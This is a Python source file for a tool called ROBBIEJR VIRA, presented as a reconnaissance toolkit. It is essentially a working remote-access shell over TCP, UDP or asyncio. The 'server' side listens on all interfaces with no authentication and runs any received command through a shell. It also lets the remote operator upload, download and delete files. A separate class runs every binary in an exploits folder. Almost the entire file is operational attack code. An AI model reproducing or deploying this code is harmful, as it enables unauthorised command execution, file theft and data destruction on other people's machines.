# ROBBIEJR VIRA

import os
import socket
import sys
import time
import threading
import asyncio
import logging
import requests
import json
import random
import string
import hashlib
import re
import argparse
import subprocess

DEFAULT_PORT = 9999
BUFFER_SIZE = 8192
ASYNC_END_MARKER = "__VIRA_END_OF_OUTPUT__"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

class Color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Utils:
    def __init__(self):
        self.banner = """
╔═════════════════════════════════════════════════════════╗
║                                                         ║
║     ██████╗  ██████╗ ██████╗ ██████╗ ███████╗ ██████╗    ║
║    ██╔════╝ ██╔═══██╗██╔══██╗██╔══██╗██╔════╝██╔═══██╗   ║
║    ██║  ███╗██║   ██║██████╔╝██████╔╝█████╗  ██║   ██║   ║
║    ██║   ██║██║   ██║██╔═══╝ ██╔══██╗██╔══╝  ██║   ██║   ║
║    ╚██████╔╝╚██████╔╝██║     ██║  ██║███████╗╚██████╔╝   ║
║     ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝    ║
║                                                         ║
╚═════════════════════════════════════════════════════════╝
"""
        self.extra_info = (
            f"{Color.OKGREEN}Author: ROBBIEJR | Version: 1.0 | License: MIT | "
            f"GitHub: https://github.com/robbiejrdev/ROBBIEJR-VIRA{Color.ENDC}"
        )

    def show_banner(self):
        print(Color.OKCYAN + self.banner + Color.ENDC)
        print(self.extra_info)
        print("\n")

    def styled_feedback(self, action, message):
        print(f"{Color.HEADER}[{action.upper():^7}]{Color.ENDC} {message}")

class ReverseShell:
    def __init__(self, host, port, mode=None, serve_as=None):
        self.host = host
        self.port = port
        self.mode = mode
        self.serve_as = serve_as

    def get_option(self):
        if self.mode == "tcp":
            mode = "tcp"
        elif self.mode == "udp":
            mode = "udp"
        elif self.mode == "async":
            mode = "async"
        else:
            raise ValueError("Please provide a valid protocol (tcp, udp, async)")

        if self.serve_as == "client":
            serve_as = "client"
        elif self.serve_as == "server":
            serve_as = "server"
        else:
            raise ValueError("Please provide a valid mode (client, server)")

        return mode, serve_as

    class Client:
        def __init__(self, host, port):
            self.host = host
            self.port = port

        def _prompt(self):
            return f"{Color.OKGREEN}({self.host}:{self.port}){Color.ENDC}{Color.OKBLUE} ⮞ {Color.ENDC}"

        def _decorate_action(self, command):
            verb = command.split()[0].lower() if command else ""
            if verb == "download":
                return f"{Color.HEADER}[DOWNLOAD]{Color.ENDC} {Color.OKBLUE}{command}{Color.ENDC}"
            if verb == "upload":
                return f"{Color.HEADER}[UPLOAD]{Color.ENDC} {Color.OKCYAN}{command}{Color.ENDC}"
            if verb in {"delete", "del"}:
                return f"{Color.HEADER}[DELETE]{Color.ENDC} {Color.FAIL}{command}{Color.ENDC}"
            if verb == "cd":
                return f"{Color.HEADER}[CD]{Color.ENDC} {Color.WARNING}{command}{Color.ENDC}"
            return None

        def _tcp_mode(self):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.host, self.port))
                print(f"{Color.OKGREEN}Connected to {self.host}:{self.port}{Color.ENDC}")
                while True:
                    command = input(self._prompt()).strip()
                    if not command:
                        continue
                    if command.lower() == "exit":
                        break
                    if command.lower() == "clear":
                        os.system("clear")
                        continue

                    styled = self._decorate_action(command)
                    if styled:
                        print(styled)

                    if command.lower().startswith("upload "):
                        _, filename = command.split(" ", 1)
                        self._tcp_upload(s, filename)
                        continue

                    if command.lower().startswith("download "):
                        _, filename = command.split(" ", 1)
                        self._tcp_download(s, filename)
                        continue

                    if command.lower().startswith(("delete ", "del ")):
                        _, filename = command.split(" ", 1)
                        self._tcp_delete(s, filename)
                        continue

                    s.sendall(f"{command}\n".encode())
                    response = self._recv_until_timeout(s)
                    print(f"{Color.OKCYAN}{response}{Color.ENDC}")
                s.close()
            except Exception as e:
                logging.error(f"Error in TCP mode: {e}")

        def _recv_until_timeout(self, sock, timeout=0.2):
            sock.settimeout(timeout)
            data = b""
            try:
                while True:
                    chunk = sock.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            finally:
                sock.settimeout(None)
            return data.decode(errors="replace")

        def _tcp_upload(self, sock, filename):
            try:
                filesize = os.path.getsize(filename)
                with open(filename, "rb") as handle:
                    sock.sendall(f"upload {filename} {filesize}\n".encode())
                    response = self._recv_line(sock)
                    if "ready" not in response.lower():
                        print(f"{Color.FAIL}Server refused upload: {response}{Color.ENDC}")
                        return
                    while True:
                        chunk = handle.read(BUFFER_SIZE)
                        if not chunk:
                            break
                        sock.sendall(chunk)
                    final = self._recv_line(sock)
                    print(f"{Color.OKCYAN}{final}{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error uploading file: {e}{Color.ENDC}")

        def _tcp_download(self, sock, filename):
            try:
                sock.sendall(f"download {filename}\n".encode())
                header = self._recv_line(sock)
                if not header.lower().startswith("ready to send file:"):
                    print(f"{Color.FAIL}{header}{Color.ENDC}")
                    return
                parts = header.split()
                if len(parts) < 5:
                    print(f"{Color.FAIL}Invalid server download header.{Color.ENDC}")
                    return
                filesize = int(parts[-1])
                with open(filename, "wb") as handle:
                    remaining = filesize
                    while remaining > 0:
                        chunk = sock.recv(min(BUFFER_SIZE, remaining))
                        if not chunk:
                            break
                        handle.write(chunk)
                        remaining -= len(chunk)
                print(f"{Color.OKCYAN}File {filename} downloaded successfully.{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error downloading file: {e}{Color.ENDC}")

        def _tcp_delete(self, sock, filename):
            try:
                sock.sendall(f"delete {filename}\n".encode())
                response = self._recv_line(sock)
                print(f"{Color.OKCYAN}{response}{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error deleting file: {e}{Color.ENDC}")

        def _recv_line(self, sock):
            buffer = b""
            while True:
                byte = sock.recv(1)
                if not byte or byte == b"\n":
                    break
                buffer += byte
            return buffer.decode(errors="replace")

        def _udp_mode(self):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                server_addr = (self.host, self.port)
                print(f"{Color.OKGREEN}UDP client ready for {self.host}:{self.port}{Color.ENDC}")
                while True:
                    command = input(self._prompt()).strip()
                    if not command:
                        continue
                    if command.lower() == "exit":
                        break
                    if command.lower() == "clear":
                        os.system("clear")
                        continue

                    styled = self._decorate_action(command)
                    if styled:
                        print(styled)

                    if command.lower().startswith(("delete ", "del ")):
                        sock.sendto(f"delete {command.split(' ', 1)[1]}".encode(), server_addr)
                        response, _ = sock.recvfrom(BUFFER_SIZE)
                        print(f"{Color.OKCYAN}{response.decode()}{Color.ENDC}")
                        continue

                    sock.sendto(command.encode(), server_addr)
                    response, _ = sock.recvfrom(BUFFER_SIZE)
                    print(f"{Color.OKCYAN}{response.decode()}{Color.ENDC}")
                sock.close()
            except Exception as e:
                logging.error(f"Error in UDP mode: {e}")

        async def _asyncio_based_client(self):
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                print(f"{Color.OKGREEN}Async client connected to {self.host}:{self.port}{Color.ENDC}")
                while True:
                    command = input(self._prompt()).strip()
                    if not command:
                        continue
                    if command.lower() == "exit":
                        break
                    if command.lower() == "clear":
                        os.system("clear")
                        continue

                    styled = self._decorate_action(command)
                    if styled:
                        print(styled)

                    if command.lower().startswith("upload "):
                        _, filename = command.split(" ", 1)
                        await self._async_upload(reader, writer, filename)
                        continue

                    if command.lower().startswith("download "):
                        _, filename = command.split(" ", 1)
                        await self._async_download(reader, writer, filename)
                        continue

                    if command.lower().startswith(("delete ", "del ")):
                        _, filename = command.split(" ", 1)
                        await self._async_delete(reader, writer, filename)
                        continue

                    writer.write(f"{command}\n".encode())
                    await writer.drain()
                    response = await self._read_until_marker(reader)
                    print(f"{Color.OKCYAN}{response}{Color.ENDC}")
                writer.close()
                await writer.wait_closed()
            except Exception as e:
                logging.error(f"Error in Asyncio mode: {e}")

        async def _async_upload(self, reader, writer, filename):
            try:
                filesize = os.path.getsize(filename)
                writer.write(f"upload {filename} {filesize}\n".encode())
                await writer.drain()
                response = await reader.readline()
                response_text = response.decode(errors="replace")
                if "ready" not in response_text.lower():
                    print(f"{Color.FAIL}Server refused upload: {response_text}{Color.ENDC}")
                    return

                with open(filename, "rb") as handle:
                    while True:
                        chunk = handle.read(BUFFER_SIZE)
                        if not chunk:
                            break
                        writer.write(chunk)
                        await writer.drain()
                final = await reader.readline()
                print(f"{Color.OKCYAN}{final.decode(errors='replace').strip()}{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error uploading file: {e}{Color.ENDC}")

        async def _async_download(self, reader, writer, filename):
            try:
                writer.write(f"download {filename}\n".encode())
                await writer.drain()
                header = await reader.readline()
                header_text = header.decode(errors="replace").strip()
                if not header_text.lower().startswith("ready to send file:"):
                    print(f"{Color.FAIL}{header_text}{Color.ENDC}")
                    return

                parts = header_text.split()
                if len(parts) < 5:
                    print(f"{Color.FAIL}Invalid download header from server.{Color.ENDC}")
                    return
                filesize = int(parts[-1])
                with open(filename, "wb") as handle:
                    remaining = filesize
                    while remaining > 0:
                        chunk = await reader.read(min(BUFFER_SIZE, remaining))
                        if not chunk:
                            break
                        handle.write(chunk)
                        remaining -= len(chunk)
                print(f"{Color.OKCYAN}File {filename} downloaded successfully.{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error downloading file: {e}{Color.ENDC}")

        async def _async_delete(self, reader, writer, filename):
            try:
                writer.write(f"delete {filename}\n".encode())
                await writer.drain()
                response = await reader.readline()
                print(f"{Color.OKCYAN}{response.decode(errors='replace').strip()}{Color.ENDC}")
            except Exception as e:
                print(f"{Color.FAIL}Error deleting file: {e}{Color.ENDC}")

        async def _read_until_marker(self, reader):
            data = []
            while True:
                line = await reader.readline()
                if not line:
                    break
                text = line.decode(errors="replace")
                if text.strip() == ASYNC_END_MARKER:
                    break
                data.append(text)
            return "".join(data)

    class Server:
        def __init__(self, host, port):
            self.host = host
            self.port = port

        def _tcp_mode(self):
            try:
                server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_sock.bind((self.host, self.port))
                server_sock.listen(5)
                logging.info(f"{Color.OKCYAN}Listening for incoming TCP connections on{Color.ENDC} {Color.BOLD}{self.host}:{self.port}{Color.ENDC}")
                conn, addr = server_sock.accept()
                logging.info(f"{Color.OKGREEN}Connection established with{Color.ENDC} {Color.BOLD}{addr}{Color.ENDC}")
                with conn:
                    while True:
                        data = self._recv_line(conn)
                        if not data:
                            break
                        command = data.strip()
                        if not command:
                            continue

                        if command.lower().startswith("cd "):
                            target_dir = command[3:].strip()
                            self._handle_cd(conn, target_dir)
                            continue

                        if command.lower().startswith("upload "):
                            self._handle_upload(conn, command)
                            continue

                        if command.lower().startswith("download "):
                            self._handle_download(conn, command)
                            continue

                        if command.lower().startswith(("delete ", "del ")):
                            self._handle_delete(conn, command)
                            continue

                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        conn.sendall((output.stdout + output.stderr).encode())
                server_sock.close()
            except Exception as e:
                logging.error(f"Error in TCP server mode: {e}")

        def _recv_line(self, conn):
            buffer = b""
            while True:
                chunk = conn.recv(1)
                if not chunk or chunk == b"\n":
                    break
                buffer += chunk
            return buffer.decode(errors="replace")

        def _handle_cd(self, conn, target_dir):
            try:
                os.chdir(target_dir)
                conn.sendall(f"{Color.OKCYAN}Changed directory to {os.getcwd()}{Color.ENDC}\n".encode())
            except Exception as err:
                conn.sendall(f"{Color.FAIL}Error changing directory: {err}{Color.ENDC}\n".encode())

        def _handle_upload(self, conn, command):
            parts = command.split(" ", 2)
            filename = parts[1] if len(parts) > 1 else ""
            filesize = None
            if len(parts) == 3:
                try:
                    filesize = int(parts[2])
                except ValueError:
                    filesize = None

            if not filename:
                conn.sendall(f"{Color.FAIL}Missing upload filename.{Color.ENDC}\n".encode())
                return

            conn.sendall(f"{Color.OKCYAN}Ready to receive file: {filename}{Color.ENDC}\n".encode())
            filepath = os.path.join(os.getcwd(), filename)
            try:
                with open(filepath, "wb") as handle:
                    remaining = filesize
                    while remaining is None or remaining > 0:
                        chunk = conn.recv(min(BUFFER_SIZE, remaining or BUFFER_SIZE))
                        if not chunk:
                            break
                        handle.write(chunk)
                        if remaining is not None:
                            remaining -= len(chunk)
                            if remaining <= 0:
                                break
                conn.sendall(f"{Color.OKCYAN}File {filename} uploaded successfully.{Color.ENDC}\n".encode())
            except Exception as err:
                conn.sendall(f"{Color.FAIL}Error uploading file: {err}{Color.ENDC}\n".encode())

        def _handle_download(self, conn, command):
            parts = command.split(" ", 1)
            filename = parts[1] if len(parts) > 1 else ""
            filepath = os.path.join(os.getcwd(), filename)
            if not filename or not os.path.exists(filepath):
                conn.sendall(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode())
                return
            filesize = os.path.getsize(filepath)
            conn.sendall(f"{Color.OKCYAN}Ready to send file: {filename} {filesize}{Color.ENDC}\n".encode())
            with open(filepath, "rb") as handle:
                while True:
                    chunk = handle.read(BUFFER_SIZE)
                    if not chunk:
                        break
                    conn.sendall(chunk)

        def _handle_delete(self, conn, command):
            parts = command.split(" ", 1)
            filename = parts[1] if len(parts) > 1 else ""
            filepath = os.path.join(os.getcwd(), filename)
            if not filename:
                conn.sendall(f"{Color.FAIL}Missing delete filename.{Color.ENDC}\n".encode())
                return
            if not os.path.exists(filepath):
                conn.sendall(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode())
                return
            try:
                os.remove(filepath)
                conn.sendall(f"{Color.OKCYAN}Deleted file: {filename}{Color.ENDC}\n".encode())
            except Exception as err:
                conn.sendall(f"{Color.FAIL}Error deleting file: {err}{Color.ENDC}\n".encode())

        def _udp_mode(self):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.bind((self.host, self.port))
                logging.info(f"{Color.OKCYAN}Serving on{Color.ENDC} {Color.BOLD}{self.host}:{self.port}{Color.ENDC}")
                while True:
                    data, addr = sock.recvfrom(BUFFER_SIZE)
                    if not data:
                        continue
                    command = data.decode(errors="replace").strip()
                    if not command:
                        continue

                    if command.lower().startswith("cd "):
                        target_dir = command[3:].strip()
                        try:
                            os.chdir(target_dir)
                            response = f"{Color.OKCYAN}Changed directory to {os.getcwd()}{Color.ENDC}\n"
                        except Exception as err:
                            response = f"{Color.FAIL}Error changing directory: {err}{Color.ENDC}\n"
                        sock.sendto(response.encode(), addr)
                        continue

                    if command.lower().startswith("upload "):
                        parts = command.split(" ", 2)
                        filename = parts[1] if len(parts) > 1 else ""
                        filesize = None
                        if len(parts) == 3:
                            try:
                                filesize = int(parts[2])
                            except ValueError:
                                filesize = None
                        if not filename:
                            sock.sendto(f"{Color.FAIL}Missing upload filename.{Color.ENDC}\n".encode(), addr)
                            continue
                        filepath = os.path.join(os.getcwd(), filename)
                        try:
                            sock.sendto(f"{Color.OKCYAN}Ready to receive file: {filename}{Color.ENDC}\n".encode(), addr)
                            with open(filepath, "wb") as handle:
                                remaining = filesize
                                while remaining is None or remaining > 0:
                                    chunk, _ = sock.recvfrom(BUFFER_SIZE)
                                    if not chunk:
                                        break
                                    handle.write(chunk)
                                    if remaining is not None:
                                        remaining -= len(chunk)
                                        if remaining <= 0:
                                            break
                            sock.sendto(f"{Color.OKCYAN}File {filename} uploaded successfully.{Color.ENDC}\n".encode(), addr)
                        except Exception as err:
                            sock.sendto(f"{Color.FAIL}Error uploading file: {err}{Color.ENDC}\n".encode(), addr)
                        continue

                    if command.lower().startswith("download "):
                        filename = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else ""
                        filepath = os.path.join(os.getcwd(), filename)
                        if not filename or not os.path.exists(filepath):
                            sock.sendto(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode(), addr)
                            continue
                        filesize = os.path.getsize(filepath)
                        sock.sendto(f"{Color.OKCYAN}Ready to send file: {filename} {filesize}{Color.ENDC}\n".encode(), addr)
                        with open(filepath, "rb") as handle:
                            while True:
                                chunk = handle.read(BUFFER_SIZE)
                                if not chunk:
                                    break
                                sock.sendto(chunk, addr)
                        continue

                    if command.lower().startswith(("delete ", "del ")):
                        filename = command.split(" ", 1)[1] if len(command.split(" ", 1)) > 1 else ""
                        filepath = os.path.join(os.getcwd(), filename)
                        if not filename:
                            sock.sendto(f"{Color.FAIL}Missing delete filename.{Color.ENDC}\n".encode(), addr)
                            continue
                        if not os.path.exists(filepath):
                            sock.sendto(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode(), addr)
                            continue
                        try:
                            os.remove(filepath)
                            sock.sendto(f"{Color.OKCYAN}Deleted file: {filename}{Color.ENDC}\n".encode(), addr)
                        except Exception as err:
                            sock.sendto(f"{Color.FAIL}Error deleting file: {err}{Color.ENDC}\n".encode(), addr)
                        continue

                    output = subprocess.run(command, shell=True, capture_output=True, text=True)
                    sock.sendto((output.stdout + output.stderr).encode(), addr)
            except Exception as e:
                logging.error(f"Error in UDP server mode: {e}")

        async def _asyncio_based_server(self):
            try:
                server = await asyncio.start_server(self._handle_client, self.host, self.port)
                addr = server.sockets[0].getsockname()
                logging.info(f"Serving on {addr[0]}:{addr[1]}")
                async with server:
                    await server.serve_forever()
            except Exception as e:
                logging.error(f"Error in Asyncio server mode: {e}")

        async def _handle_client(self, reader, writer):
            addr = writer.get_extra_info("peername")
            logging.info(f"{Color.OKGREEN}Async connection established with{Color.ENDC} {Color.BOLD}{addr}{Color.ENDC}")
            try:
                while True:
                    line = await reader.readline()
                    if not line:
                        break
                    command = line.decode(errors="replace").strip()
                    if not command:
                        continue

                    if command.lower().startswith("cd "):
                        target_dir = command[3:].strip()
                        await self._async_handle_cd(writer, target_dir)
                        continue

                    if command.lower().startswith("upload "):
                        await self._async_handle_upload(reader, writer, command)
                        continue

                    if command.lower().startswith("download "):
                        await self._async_handle_download(reader, writer, command)
                        continue

                    if command.lower().startswith(("delete ", "del ")):
                        await self._async_handle_delete(writer, command)
                        continue

                    process = await asyncio.create_subprocess_shell(
                        command,
                        stdout=asyncio.subprocess.PIPE,
                        stderr=asyncio.subprocess.PIPE,
                    )
                    stdout, stderr = await process.communicate()
                    writer.write(stdout + stderr)
                    writer.write(f"{ASYNC_END_MARKER}\n".encode())
                    await writer.drain()
            except Exception as e:
                logging.error(f"Error in Asyncio client handler: {e}")
            finally:
                writer.close()
                await writer.wait_closed()

        async def _async_handle_cd(self, writer, target_dir):
            try:
                os.chdir(target_dir)
                writer.write(f"{Color.OKCYAN}Changed directory to {os.getcwd()}{Color.ENDC}\n".encode())
            except Exception as err:
                writer.write(f"{Color.FAIL}Error changing directory: {err}{Color.ENDC}\n".encode())
            writer.write(f"{ASYNC_END_MARKER}\n".encode())
            await writer.drain()

        async def _async_handle_upload(self, reader, writer, command):
            parts = command.split(" ", 2)
            filename = parts[1] if len(parts) > 1 else ""
            filesize = None
            if len(parts) == 3:
                try:
                    filesize = int(parts[2])
                except ValueError:
                    filesize = None
            if not filename:
                writer.write(f"{Color.FAIL}Missing upload filename.{Color.ENDC}\n".encode())
                await writer.drain()
                return

            writer.write(f"{Color.OKCYAN}Ready to receive file: {filename}{Color.ENDC}\n".encode())
            await writer.drain()
            filepath = os.path.join(os.getcwd(), filename)
            try:
                with open(filepath, "wb") as handle:
                    remaining = filesize
                    while remaining is None or remaining > 0:
                        chunk = await reader.read(min(BUFFER_SIZE, remaining or BUFFER_SIZE))
                        if not chunk:
                            break
                        handle.write(chunk)
                        if remaining is not None:
                            remaining -= len(chunk)
                            if remaining <= 0:
                                break
                writer.write(f"{Color.OKCYAN}File {filename} uploaded successfully.{Color.ENDC}\n".encode())
            except Exception as err:
                writer.write(f"{Color.FAIL}Error uploading file: {err}{Color.ENDC}\n".encode())
            writer.write(f"{ASYNC_END_MARKER}\n".encode())
            await writer.drain()

        async def _async_handle_download(self, reader, writer, command):
            parts = command.split(" ", 1)
            filename = parts[1] if len(parts) > 1 else ""
            filepath = os.path.join(os.getcwd(), filename)
            if not filename or not os.path.exists(filepath):
                writer.write(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode())
                writer.write(f"{ASYNC_END_MARKER}\n".encode())
                await writer.drain()
                return
            filesize = os.path.getsize(filepath)
            writer.write(f"{Color.OKCYAN}Ready to send file: {filename} {filesize}{Color.ENDC}\n".encode())
            await writer.drain()
            with open(filepath, "rb") as handle:
                while True:
                    chunk = handle.read(BUFFER_SIZE)
                    if not chunk:
                        break
                    writer.write(chunk)
                    await writer.drain()
            writer.write(f"{ASYNC_END_MARKER}\n".encode())
            await writer.drain()

        async def _async_handle_delete(self, writer, command):
            parts = command.split(" ", 1)
            filename = parts[1] if len(parts) > 1 else ""
            filepath = os.path.join(os.getcwd(), filename)
            if not filename:
                writer.write(f"{Color.FAIL}Missing delete filename.{Color.ENDC}\n".encode())
                writer.write(f"{ASYNC_END_MARKER}\n".encode())
                await writer.drain()
                return
            if not os.path.exists(filepath):
                writer.write(f"{Color.FAIL}File not found: {filename}{Color.ENDC}\n".encode())
                writer.write(f"{ASYNC_END_MARKER}\n".encode())
                await writer.drain()
                return
            try:
                os.remove(filepath)
                writer.write(f"{Color.OKCYAN}Deleted file: {filename}{Color.ENDC}\n".encode())
            except Exception as err:
                writer.write(f"{Color.FAIL}Error deleting file: {err}{Color.ENDC}\n".encode())
            writer.write(f"{ASYNC_END_MARKER}\n".encode())
            await writer.drain()

class Exploits:
    def __init__(self, type=None, level=1):
        self.type = type
        self.level = level

    def get_options(self):
        if self.type == "auto":
            type = "auto"
        elif self.type == "manual":
            type = "manual"
        else:
            raise ValueError("Please provide valid options (auto, manual)")

        if self.level == 1:
            level = 1
        elif self.level == 2:
            level = 2
        elif self.level == 3:
            level = 3
        else:
            raise ValueError("Ranges from 1-3")

        return type, level

    class AutoReconnaissance:
        def __init__(self, payloads_path="exploits/auto", payloads_syntax="c"):
            self.payloads_path = payloads_path
            self.payloads_syntax = payloads_syntax

        def exploit(self):
            available_exploits = os.listdir(self.payloads_path)
            for v in available_exploits:
                res = subprocess.run(["./" + self.payloads_path + "/" + v], capture_output=True, text=True)
                if res.returncode == 0:
                    logging.info(f"{Color.OKGREEN}Exploit {v} executed successfully.{Color.ENDC}")
                else:
                    logging.error(f"{Color.FAIL}Exploit {v} failed to execute.{Color.ENDC}")


def parse_args():
    parser = argparse.ArgumentParser(
        description="-=-=-=-=-=-=-=ROBBIEJR-VIRA-=-=-=-=-=-=-\nAn ML Based reconnaissance toolkit meant for cybersecurity"
    )
    parser.add_argument("-q", "--dont-load-banner", action="store_true", help="don't load the banner upon start")
    parser.add_argument("-pr", "--proxies", help="proxies file to be loaded")
    parser.add_argument("-l", "--listen", action="store_true", help="listen mode for reverse shell")
    parser.add_argument("-c", "--connect", help="connect to a listening server")
    parser.add_argument("-t", "--target", help="target host for reverse shell")
    parser.add_argument("-p", "--port", type=int, help="target port for reverse shell")
    parser.add_argument("-a", "--auto", action="store_true", help="automatic recon upon reverse shell")
    parser.add_argument("-m", "--manual", action="store_true", help="manual recon upon reverse shell")
    parser.add_argument("-ml", "--mode", choices=["tcp", "udp", "async"], help="protocol mode for reverse shell")
    return parser.parse_args()


def main():
    args = parse_args()

    if not args.dont_load_banner:
        Utils().show_banner()

    if not args.mode:
        logging.error("Please specify a mode with --mode tcp|udp|async.")
        return

    port = args.port or DEFAULT_PORT
    if args.listen:
        server_instance = ReverseShell.Server("0.0.0.0", port)
        if args.mode == "tcp":
            server_instance._tcp_mode()
        elif args.mode == "udp":
            server_instance._udp_mode()
        elif args.mode == "async":
            asyncio.run(server_instance._asyncio_based_server())
        else:
            logging.error(f"Unsupported server mode: {args.mode}")
        return

    host = args.connect or args.target
    if host:
        client_instance = ReverseShell.Client(host, port)
        if args.mode == "tcp":
            client_instance._tcp_mode()
        elif args.mode == "udp":
            client_instance._udp_mode()
        elif args.mode == "async":
            asyncio.run(client_instance._asyncio_based_client())
        else:
            logging.error(f"Unsupported client mode: {args.mode}")
        return

    logging.error("Please specify --listen for server mode or --connect/--target for client mode.")


if __name__ == "__main__":
    main()
